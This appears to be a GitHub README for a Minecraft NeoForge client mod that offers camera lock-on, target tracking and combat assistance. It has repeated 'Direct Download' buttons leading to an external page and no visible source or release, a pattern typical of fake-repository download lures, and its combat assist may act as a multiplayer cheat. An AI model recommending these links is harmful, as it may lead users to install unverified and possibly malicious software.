# Action Camera Lock-On v1.0 - Game Script Utility 2026

> Client-side Minecraft NeoForge 1.21.1 mod for camera lock-on, target tracking, and configurable combat support.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20NeoForge%201.21.1-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henryafuprice5618/action-camera-lockon-script?style=flat-square)](https://github.com/henryafuprice5618/action-camera-lockon-script)

---

<p align="center">
  <a href="https://henryafuprice5618.github.io/action-camera-lockon-script/">
    <img src="https://img.shields.io/badge/Download-Action%20Camera%20Lock-On%20Script-brightgreen?style=for-the-badge" alt="Download Action Camera Lock-On Script">
  </a>
</p>

> **[Direct Download - Action Camera Lock-On](https://henryafuprice5618.github.io/action-camera-lockon-script/)**

---

[Download Latest Build](https://henryafuprice5618.github.io/action-camera-lockon-script/)

---

## What it does

Action Camera Lock-On is a NeoForge 1.21.1 client mod for Minecraft that centers on locking the camera to targets, following entity movement, and offering combat assistance you can tune in game. Its design is aimed at helping players maintain focus on a chosen opponent while moving through fights.

The mod combines several target-selection modes with visibility-aware checks, so nearby enemies can be handled in a more controlled way. It also ships with a 3D reticle and hotkey-based controls, which make it simpler to swap targets, tweak behavior, and toggle the lock state during gameplay.

## Script Features

- Smooth camera tracking for guided target focus
- Smart lock mode for adaptive target handling
- Always lock mode for persistent camera locking
- Target switching for moving between valid entities
- Proximity-based target priority for nearby threats
- Hostile-only filtering to narrow the target pool
- Line-of-sight checks for visibility-aware selection
- 3D reticle rendering for on-screen targeting feedback
- In-game configuration UI for runtime adjustments
- Keybind controls for quick toggles and mode changes

## Setup

1. Download the latest build from the project page.
2. Place the mod into your Minecraft NeoForge 1.21.1 mods folder.
3. Launch the game with the matching NeoForge profile.
4. Open the in-game configuration UI to adjust lock behavior, targeting rules, and keybinds.

Example folder location:
- Windows: `%appdata%/.minecraft/mods`
- macOS: `~/Library/Application Support/minecraft/mods`
- Linux: `~/.minecraft/mods`

## Options

| Option | Description |
| --- | --- |
| Smart Lock | Switches targeting behavior based on available entities |
| Always Lock | Keeps camera lock enabled while active |
| Hostile Filter | Limits targeting to hostile entities |
| Line-of-Sight | Requires visibility before a target is selected |
| Proximity Priority | Prefers nearby targets when multiple options are available |
| Target Switch Keybind | Changes the current lock target |
| Config UI | Opens the in-game settings panel |
| Reticle Toggle | Shows or hides the 3D targeting reticle |

## Compatibility

Action Camera Lock-On is built for the client side of Minecraft NeoForge 1.21.1. It targets the modded Minecraft environment and is not meant for vanilla-only installations.

Known limitations:
- The mod depends on the matching Minecraft and NeoForge version.
- Target selection can vary based on entity visibility and the active filter settings.
- Behavior may differ in worlds or servers with unusual entity handling or combat rules.

## FAQ

### How do I install it?
Download the build, copy it into the `mods` folder, and start Minecraft with NeoForge 1.21.1.

### How do I change settings?
Use the in-game configuration UI and keybind controls after loading into the game.

### Can I update it without changing my setup?
Usually yes. Replace the old build with the newer file, then relaunch the game with the same version stack.

### What if the mod does not activate?
Check that the game version is Minecraft 1.21.1 and that NeoForge is installed correctly.

### Does it store settings?
Configuration is handled through the mod's in-game options and the normal Minecraft mod setup flow.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
